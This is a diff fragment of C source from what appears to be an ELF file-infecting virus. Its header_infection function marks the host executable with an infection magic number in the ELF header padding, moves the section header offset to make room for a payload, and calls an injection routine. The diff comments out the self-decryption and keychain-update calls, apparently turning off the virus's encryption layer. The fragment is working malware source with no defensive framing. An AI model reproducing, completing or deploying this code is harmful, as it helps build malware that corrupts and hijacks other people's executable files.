@@ -6,7 +6,7 @@
 
 void header_infection(struct s_host *host, struct s_keychain *keychain)
 {
-	decrypt_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
+//	decrypt_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);
 
 	*(unsigned int *)&host->header->e_ident[EI_PAD] = INFECTED_MAGIC_NUMBER;
 
@@ -16,8 +16,8 @@ void header_infection(struct s_host *host, struct s_keychain *keychain)
 
 	host->header->e_shoff += PAYLOAD_SIZE + (host->note->self->p_offset - (host->note->data->p_offset + host->note->data->p_filesz));
 
-	update_keychain_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
-	decrypt_right(keychain, (char *)injection, (void *)__exit - (void *)injection);
+//	update_keychain_right(keychain, (char *)header_infection, (void *)injection - (void *)header_infection);
+//	decrypt_right(keychain, (char *)injection, (void *)__exit - (void *)injection);
 
 	injection(host, keychain);
 }
